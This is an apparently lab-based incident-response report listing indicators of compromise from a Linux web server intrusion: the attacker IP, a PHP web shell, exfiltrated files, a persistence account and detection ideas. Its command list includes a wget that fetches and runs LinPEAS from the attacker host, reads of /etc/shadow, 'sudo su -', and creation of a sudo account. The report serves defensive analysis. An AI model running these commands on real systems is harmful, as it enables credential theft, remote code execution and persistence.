# Indicators of Compromise (IOCs)

## Overview

This document summarizes the key Indicators of Compromise identified during the investigation of the Linux server `brightstar-web`.

The indicators were extracted by correlating Apache access logs, Linux authentication logs, and FTP server logs in Splunk.

> **Scope Note:** All indicators in this repository belong to a controlled lab environment and should not be treated as real-world threat intelligence.

---

## 1. Network Indicators

| Indicator | Type | Context | Confidence |
|---|---|---|---|
| `172.16.20.99` | IPv4 Address | Source of web reconnaissance, credential attacks, SSH compromise, FTP access, file transfer, and data exfiltration | Confirmed |
| `172.16.20.99:8080` | IP and Port | Source used to transfer `linpeas.sh` to the compromised server | Confirmed |

### Analyst Assessment

The IP address `172.16.20.99` was consistently associated with malicious activity across all three analyzed log sources.

Observed activity included:

- Nmap reconnaissance
- Nikto vulnerability scanning
- Gobuster directory enumeration
- Hydra credential attacks
- PHP web shell interaction
- LinPEAS transfer
- SSH authentication attacks
- Successful SSH access as `developer`
- Successful FTP access as `root`
- Sensitive data exfiltration
- Suspicious file upload

Because `172.16.20.99` is a private RFC1918 address, it should be treated as an internal lab indicator rather than public threat intelligence.

---

## 2. Suspicious and Malicious Files

| File or Path | Type | Context | Assessment |
|---|---|---|---|
| `/uploads/shell.php` | PHP Web Shell | Used to execute operating system commands remotely | Malicious |
| `/tmp/linpeas.sh` | Enumeration Script | Transferred and executed for Linux privilege escalation enumeration | Dual-use tool used maliciously |
| `/tmp/.hidden/beacon.sh` | Shell Script | Uploaded after root compromise and data exfiltration | Suspicious; functionality unconfirmed |
| `/tmp/.hidden/` | Hidden Directory | Destination of the suspicious `beacon.sh` upload | Suspicious |

### Analytical Note

The investigation confirms interaction with `shell.php`, transfer and execution of `linpeas.sh`, and successful upload of `beacon.sh`.

However, the available evidence does not include file hashes or the contents of `beacon.sh`. Therefore, no claims are made regarding its exact functionality, execution, or command-and-control behavior.

---

## 3. Compromised and Attacker-Created Accounts

| Account | Role in Incident | Assessment |
|---|---|---|
| `developer` | Legitimate account successfully accessed over SSH and used to obtain root privileges | Compromised |
| `root` | Used for successful FTP authentication and sensitive data exfiltration | Compromised or abused |
| `svc_monitor` | Privileged account created and added to the `sudo` group | Attacker-created persistence account |

### Analyst Assessment

The `developer` account was successfully accessed using password authentication from the attacker IP.

The `svc_monitor` account represents confirmed persistence because it was created with an interactive shell, assigned a password, and added to the `sudo` group.

The exact source of the credentials used for the successful `root` FTP authentication could not be conclusively determined.

---

## 4. Malicious and Suspicious Web Resources

| Resource | Context | Assessment |
|---|---|---|
| `/uploads/shell.php` | PHP web shell used for command execution | Malicious |
| `/admin/login` | Target of Hydra credential attack | Targeted resource |
| `/admin/upload` | Used before appearance of the PHP web shell | Associated with web shell deployment |
| `/admin/dashboard` | Accessed following suspected successful credential compromise | Compromised administrative resource |
| `/admin/settings` | Accessed following suspected successful credential compromise | Compromised administrative resource |
| `/admin/users` | Accessed following suspected successful credential compromise | Compromised administrative resource |

---

## 5. Offensive Tools Identified

| Tool | Evidence | Purpose in Attack |
|---|---|---|
| Nmap | User-Agent activity | Active reconnaissance and service probing |
| Nikto | `Nikto/2.5.0` User-Agent | Web vulnerability scanning |
| Gobuster | `gobuster/3.6` User-Agent | Directory and endpoint enumeration |
| Hydra | Hydra User-Agent and rapid authentication attempts | Credential attack against administrative login |
| LinPEAS | Downloaded to `/tmp/linpeas.sh` and executed | Linux privilege escalation enumeration |

### Analyst Assessment

The presence of an offensive security tool is not inherently malicious. In this incident, the tools are considered relevant because they were observed as part of a broader confirmed attack chain originating from the same source IP.

---

## 6. Sensitive Files Accessed or Exfiltrated

| File | Activity | Status |
|---|---|---|
| `/var/backups/customer_db.sql` | Discovered, accessed, and downloaded through FTP | Confirmed exfiltration |
| `/etc/ssl/private/payment_keys.pem` | Downloaded through FTP | Confirmed exfiltration |
| `/var/backups/employee_data.csv` | Downloaded through FTP | Confirmed exfiltration |
| `/var/www/html/config.php` | Accessed during web shell activity and downloaded through FTP | Confirmed exfiltration |
| `/etc/shadow` | Attempted through web shell and later accessed using sudo | Confirmed privileged access |
| `/var/log/auth.log` | Downloaded through FTP by `svc_monitor` | Confirmed download |
| `/var/log/apache2/access.log` | Downloaded through FTP by `svc_monitor` | Confirmed download |

---

## 7. Suspicious Commands and Behavioral Indicators

The following commands were associated with post-exploitation activity:

- `cat /etc/passwd`
- `cat /etc/shadow`
- `netstat -tlnp`
- `ps aux`
- `ifconfig`
- `find / -name *.sql -type f`
- `find / -name *.pem -type f`
- `cat /var/backups/customer_db.sql`
- `wget http://172.16.20.99:8080/linpeas.sh -O /tmp/linpeas.sh`
- `chmod +x /tmp/linpeas.sh`
- `bash /tmp/linpeas.sh`
- `sudo cat /etc/shadow`
- `sudo su -`
- `useradd -m -s /bin/bash svc_monitor`
- `usermod -aG sudo svc_monitor`

> Individual commands such as `ps`, `ifconfig`, `wget`, or `find` are not malicious by themselves. Their significance comes from the surrounding attack context, source IP, execution sequence, and correlation with confirmed compromise activity.

---

## 8. Recommended Detection Opportunities

Based on the observed indicators and behaviors, useful detection opportunities include:

- Multiple failed SSH authentications from a single source followed by a successful login.
- Rapid authentication attempts against multiple usernames.
- Successful SSH authentication following repeated password failures.
- Access to `/etc/shadow` through sudo.
- Execution of `sudo su -` by a non-root user.
- Creation of new local accounts with interactive shells.
- Addition of newly created accounts to the `sudo` group.
- Web requests containing suspicious command-execution parameters such as `cmd=`.
- Access to newly uploaded `.php` files inside upload directories.
- Execution of known enumeration scripts from `/tmp`.
- FTP authentication as `root`.
- Downloads of database backups, private keys, configuration files, or log files.
- Uploads to hidden directories under `/tmp`.
- Use of offensive-tool User-Agent strings in production web traffic.

---

## IOC Summary

The most significant indicators identified during the investigation were:

- **Attacker IP:** `172.16.20.99`
- **Compromised Host:** `brightstar-web`
- **Compromised User:** `developer`
- **Privileged Persistence Account:** `svc_monitor`
- **Malicious Web Shell:** `/uploads/shell.php`
- **Enumeration Tool:** `/tmp/linpeas.sh`
- **Suspicious Uploaded Script:** `/tmp/.hidden/beacon.sh`
- **Highest Privilege Achieved:** `root`
- **Confirmed Data Exfiltration:** Yes

The strongest detection value comes not from any single indicator alone, but from correlating multiple behaviors across web, authentication, and FTP telemetry.
